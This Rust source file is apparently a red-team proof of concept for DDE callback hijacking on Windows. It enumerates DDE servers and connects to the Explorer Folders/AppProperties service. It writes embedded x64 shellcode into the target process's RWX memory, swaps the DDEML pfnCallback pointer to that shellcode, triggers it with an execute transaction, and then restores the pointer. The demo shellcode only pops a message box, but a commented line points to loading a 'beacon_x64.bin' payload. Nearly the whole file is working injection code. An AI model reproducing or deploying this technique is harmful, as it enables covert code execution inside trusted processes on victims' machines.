#![allow(non_snake_case, non_camel_case_types)]
use std::{
    mem::{offset_of, zeroed},
    ops::Add,
    os::raw::c_void,
    ptr::null_mut,
};

use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::{
        DataExchange::{
            APPCLASS_STANDARD, APPCMD_FILTERINITS, CONVINFO, CP_WINANSI, DMLERR_NO_ERROR,
            DdeClientTransaction, DdeConnect, DdeConnectList, DdeCreateStringHandleA,
            DdeDisconnectList, DdeFreeStringHandle, DdeGetLastError, DdeInitializeA,
            DdeQueryConvInfo, DdeQueryNextServer, DdeQueryStringA, HCONV, HSZ, PFNCALLBACK,
            QID_SYNC, XTYP_EXECUTE,
        },
        Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
        Threading::{
            OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
            PROCESS_VM_WRITE, QueryFullProcessImageNameA,
        },
    },
    UI::WindowsAndMessaging::{GetWindowLongPtrA, GetWindowThreadProcessId},
};

// const SHELLCODE: &[u8] = include_bytes!("../beacon_x64.bin");
const SHELLCODE: [u8; 319] = [
    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41,
    0x50, 0x52, 0x48, 0x31, 0xd2, 0x51, 0x56, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18,
    0x48, 0x8b, 0x52, 0x20, 0x41, 0xb9, 0xa7, 0x07, 0x20, 0x6f, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f,
    0xb7, 0x4a, 0x48, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9,
    0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c,
    0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x6f, 0x00, 0x00, 0x00, 0x8b,
    0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x64, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48,
    0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x53, 0x44, 0x8b, 0x4c, 0x24, 0x08, 0x48,
    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9,
    0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x45, 0x39, 0xd1, 0x75, 0xdb, 0x58, 0x44, 0x8b,
    0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01,
    0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41,
    0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59,
    0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0xe8, 0x0b, 0x00, 0x00, 0x00, 0x75,
    0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x59, 0x41, 0xba, 0xa4, 0x89, 0xbc,
    0x59, 0xff, 0xd5, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x17, 0x00, 0x00, 0x00, 0x44,
    0x44, 0x45, 0x20, 0x43, 0x61, 0x6c, 0x6c, 0x62, 0x61, 0x63, 0x6b, 0x20, 0x48, 0x69, 0x6a, 0x61,
    0x63, 0x6b, 0x69, 0x6e, 0x67, 0x00, 0x5a, 0xe8, 0x0b, 0x00, 0x00, 0x00, 0x44, 0x44, 0x45, 0x20,
    0x4d, 0x73, 0x67, 0x42, 0x6f, 0x78, 0x00, 0x41, 0x58, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x4a, 0x12,
    0xea, 0xc0, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xbf, 0xdb, 0x19, 0x69, 0xff, 0xd5,
];
const SHELLCODE_SIZE: usize = SHELLCODE.len();

type LATOM = u16;

type PLINK_COUNT = *mut c_void;

#[repr(C)]
struct SERVER_LOOKUP {
    laService: LATOM,
    laTopic: LATOM,
    hwndServer: isize,
}
type PSERVER_LOOKUP = *mut SERVER_LOOKUP;

#[repr(C)]
struct CL_INSTANCE_INFO {
    next: *const CL_INSTANCE_INFO,
    hInstServer: *mut c_void,
    hInstClient: *mut c_void,
    MonitorFlags: u32,
    hwndMother: isize,
    hwndEvent: isize,
    hwndTimeout: isize,
    afCmd: u32,
    pfnCallback: PFNCALLBACK,
    LastError: u32,
    tid: u32,
    plaNameService: *mut u16,
    cNameServiceAlloc: u16,
    aServerLookup: PSERVER_LOOKUP,
    cServerLookupAlloc: i16,
    ConvStartupState: u16,
    flags: u16,
    cInDDEMLCallback: i16,
    pLinkCount: PLINK_COUNT,
}

#[repr(C)]
struct CONV_INFO {
    padding: [u8; 0x008],
    instance: *const CL_INSTANCE_INFO,
}

fn hsz_to_string(instance_id: u32, hsz: HSZ) -> String {
    unsafe {
        if hsz.is_null() {
            return String::new();
        }

        let len = DdeQueryStringA(instance_id, hsz, null_mut(), 0, CP_WINANSI);
        if len == 0 {
            return String::new();
        }
        let mut buffer = vec![0; len as usize + 1];
        if DdeQueryStringA(instance_id, hsz, buffer.as_mut_ptr(), len + 1, CP_WINANSI) == 0 {
            println!(
                "[-] DdeQueryStringA failed: {}",
                DdeGetLastError(instance_id)
            );
            return String::new();
        }

        let string = buffer.iter().position(|&b| b == 0).unwrap_or(buffer.len());
        String::from_utf8_lossy(&buffer[..string]).into_owned()
    }
}

fn get_proc_name(pid: u32) -> String {
    unsafe {
        let handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);

        if handle.is_null() {
            println!(
                "[-] OpenProcess failed: {}",
                std::io::Error::last_os_error()
            );
            return String::new();
        }

        let mut buffer = [0; 260];
        let mut size = buffer.len() as u32;
        if QueryFullProcessImageNameA(handle, 0, buffer.as_mut_ptr(), &mut size) == 0 {
            println!(
                "[-] QueryFullProcessImageNameA failed: {}",
                std::io::Error::last_os_error()
            );
            return String::new();
        }
        CloseHandle(handle);

        let proc_name = String::from_utf8_lossy(&buffer[..size as usize]).into_owned();
        proc_name
            .rsplit('\\')
            .next()
            .unwrap_or(&proc_name)
            .to_string()
    }
}

fn enum_dde() {
    unsafe {
        let mut instance_id: u32 = 0;
        let result = DdeInitializeA(
            &mut instance_id,
            None,
            APPCLASS_STANDARD | APPCMD_FILTERINITS,
            0,
        );

        if result != DMLERR_NO_ERROR {
            println!("[-] DdeInitializeA failed with error code: {}", result);
            return;
        }

        let hlist = DdeConnectList(instance_id, null_mut(), null_mut(), null_mut(), null_mut());

        if hlist.is_null() {
            println!("[-] No DDE Servers found: {}", DdeGetLastError(instance_id));
            return;
        }

        let mut hconv = zeroed::<HCONV>();
        loop {
            hconv = DdeQueryNextServer(hlist, hconv);
            if hconv.is_null() {
                break;
            }

            let mut ci = zeroed::<CONVINFO>();
            ci.cb = size_of::<CONVINFO>() as u32;

            if DdeQueryConvInfo(hconv, QID_SYNC, &mut ci) == 0 {
                println!(
                    "[-] DdeQueryConvInfo failed: {}",
                    DdeGetLastError(instance_id)
                );
                continue;
            }

            let service_name = hsz_to_string(instance_id, ci.hszSvcPartner);
            let topic_name = hsz_to_string(instance_id, ci.hszTopic);
            let mut pid: u32 = 0;

            if !ci.hwndPartner.is_null() {
                GetWindowThreadProcessId(ci.hwndPartner, &mut pid);
            }

            let proc_name = get_proc_name(pid);

            println!("[+] DDE Server Found:");
            println!("    Service Name: {}", service_name);
            println!("    Topic Name: {}", topic_name);
            println!("    Process ID: {}", pid);
            println!("    Process Name: {}", proc_name);
        }

        DdeDisconnectList(hlist);
    }
}

fn restore_callback(
    h_proc: *mut c_void,
    instance_addr: *const CL_INSTANCE_INFO,
    org_callback: usize,
) {
    unsafe {
        let pfncallbk_addr =
            (instance_addr as usize).add(offset_of!(CL_INSTANCE_INFO, pfnCallback));

        let mut bytes_written: usize = 0;
        if WriteProcessMemory(
            h_proc,
            pfncallbk_addr as *mut c_void,
            &org_callback as *const _ as *const c_void,
            size_of::<usize>(),
            &mut bytes_written,
        ) == 0
        {
            println!(
                "[-] WriteProcessMemory failed: {}",
                std::io::Error::last_os_error()
            );
        }
        println!("[+] pfnCallback restored: 0x{:016x}", org_callback);
    }
}

fn inject_dde() {
    unsafe {
        let mut instance_id: u32 = 0;
        let result = DdeInitializeA(
            &mut instance_id,
            None,
            APPCLASS_STANDARD | APPCMD_FILTERINITS,
            0,
        );

        if result != DMLERR_NO_ERROR {
            println!("[-] DdeInitializeA failed with error code: {}", result);
            return;
        }

        let service_name = "Folders\0".as_ptr() as *const u8;

        let hsz_service = DdeCreateStringHandleA(instance_id, service_name, CP_WINANSI);

        let topic_name = "AppProperties\0".as_ptr() as *const u8;
        let hsz_topic = DdeCreateStringHandleA(instance_id, topic_name, CP_WINANSI);
        if hsz_service.is_null() || hsz_topic.is_null() {
            println!(
                "[-] DdeCreateStringHandleA failed: {}",
                DdeGetLastError(instance_id)
            );
            return;
        }

        let hconv = DdeConnect(instance_id, hsz_service, hsz_topic, null_mut());

        if hconv.is_null() {
            println!("[-] DdeConnect failed: {}", DdeGetLastError(instance_id));
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }

        let mut ci = zeroed::<CONVINFO>();
        ci.cb = size_of::<CONVINFO>() as u32;
        if DdeQueryConvInfo(hconv, QID_SYNC, &mut ci) == 0 {
            println!(
                "[-] DdeQueryConvInfo failed: {}",
                DdeGetLastError(instance_id)
            );
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }

        let server_hwnd = ci.hwndPartner;
        let mut pid: u32 = 0;
        if !server_hwnd.is_null() {
            GetWindowThreadProcessId(server_hwnd, &mut pid);
        }
        let proc_name = get_proc_name(pid);

        println!("[+] {} PID: {}", proc_name, pid);
        println!(
            "[+] Connected to Folders/AppProperties Handle: {:x}",
            server_hwnd as usize
        );

        let ewm0 = GetWindowLongPtrA(server_hwnd, 0);
        if ewm0 == 0 {
            println!(
                "[-] GetWindowLongPtrA failed: {}",
                std::io::Error::last_os_error()
            );
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }
        println!("[+] EWN[0] DDEMLUnicodeServer: 0x{:016x}", ewm0 as usize);

        let h_proc = OpenProcess(
            PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
            0,
            pid,
        );
        if h_proc.is_null() {
            println!(
                "[-] OpenProcess failed: {}",
                std::io::Error::last_os_error()
            );
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }

        let mut conv_info = zeroed::<CONV_INFO>();
        let mut bytes_read: usize = 0;
        if ReadProcessMemory(
            h_proc,
            ewm0 as *const c_void,
            &mut conv_info as *mut _ as *mut c_void,
            size_of::<CONV_INFO>(),
            &mut bytes_read,
        ) == 0
        {
            println!(
                "[-] ReadProcessMemory failed: {}",
                std::io::Error::last_os_error()
            );
            CloseHandle(h_proc);
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }

        let instance_addr = conv_info.instance;
        println!(
            "[+] CL_INSTANCE_INFO Address: 0x{:016x}",
            instance_addr as usize
        );

        let mut instance_info = zeroed::<CL_INSTANCE_INFO>();
        if ReadProcessMemory(
            h_proc,
            instance_addr as *const c_void,
            &mut instance_info as *mut _ as *mut c_void,
            size_of::<CL_INSTANCE_INFO>(),
            &mut bytes_read,
        ) == 0
        {
            println!(
                "[-] ReadProcessMemory failed: {}",
                std::io::Error::last_os_error()
            );
            CloseHandle(h_proc);
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }

        let org_callbak = instance_info.pfnCallback.map(|f| f as usize).unwrap_or(0);
        if org_callbak == 0 {
            println!("[-] Original callback function pointer is null");
            CloseHandle(h_proc);
            DdeFreeStringHandle(instance_id, hsz_service);
            DdeFreeStringHandle(instance_id, hsz_topic);
            return;
        }

        let mut buffer = [0u8; 8];
        if ReadProcessMemory(
            h_proc,
            org_callbak as *const c_void,
            buffer.as_mut_ptr() as *mut c_void,
            8,
            std::ptr::null_mut(),
        ) == 0
        {
            println!(
                "[-] ReadProcessMemory failed: {}",
                std::io::Error::last_os_error()
            );
            CloseHandle(h_proc);
            return;
        }

        println!("[+] pfnCallback Address: 0x{:016x}", org_callbak);
        println!(
            "[+] pfnCallback Prologue: {:02X} {:02X} {:02X} {:02X} {:02X} {:02X} {:02X} {:02X}",
            buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5], buffer[6], buffer[7]
        );

        let remote_mem = VirtualAllocEx(
            h_proc,
            null_mut(),
            SHELLCODE_SIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if remote_mem.is_null() {
            println!(
                "[-] VirtualAllocEx failed: {}",
                std::io::Error::last_os_error()
            );
            CloseHandle(h_proc);
            return;
        }

        let mut bytes_written: usize = 0;
        if WriteProcessMemory(
            h_proc,
            remote_mem,
            SHELLCODE.as_ptr() as *const c_void,
            SHELLCODE_SIZE,
            &mut bytes_written,
        ) == 0
        {
            println!(
                "[-] WriteProcessMemory failed: {}",
                std::io::Error::last_os_error()
            );
            CloseHandle(h_proc);
            return;
        }

        let pfncallbk_addr =
            (instance_addr as usize).add(offset_of!(CL_INSTANCE_INFO, pfnCallback)) as *mut c_void;

        let mut bytes_written: usize = 0;
        if WriteProcessMemory(
            h_proc,
            pfncallbk_addr,
            &remote_mem as *const _ as *const c_void,
            std::mem::size_of::<*mut c_void>(),
            &mut bytes_written,
        ) == 0
        {
            println!(
                "[-] WriteProcessMemory failed: {}",
                std::io::Error::last_os_error()
            );
            CloseHandle(h_proc);
            return;
        }

        let mut trans_result = 0;
        let result = DdeClientTransaction(
            "\0".as_ptr() as *const u8,
            1,
            hconv,
            null_mut(),
            0,
            XTYP_EXECUTE,
            5000,
            &mut trans_result,
        );

        if result.is_null() {
            println!(
                "[-] DdeClientTransaction failed: {}",
                DdeGetLastError(instance_id)
            );
        }

        restore_callback(h_proc, instance_addr, org_callbak);
    }
}

fn main() {
    let args = std::env::args().collect::<Vec<String>>();

    if args.len() < 2 {
        println!("Usage: {} <command>", args[0]);
        println!("Commands:");
        println!("  enum_dde - Enumerate DDE servers");
        println!("  inject_dde - Inject into a DDE server");
        return;
    }

    match args[1].as_str() {
        "enum_dde" => enum_dde(),
        "inject_dde" => inject_dde(),
        _ => {
            println!("Unknown command: {}", args[1]);
            println!("Usage: {} <command>", args[0]);
            println!("Commands:");
            println!("  enum_dde - Enumerate DDE servers");
            println!("  inject_dde - Inject into a DDE server");
        }
    }
}
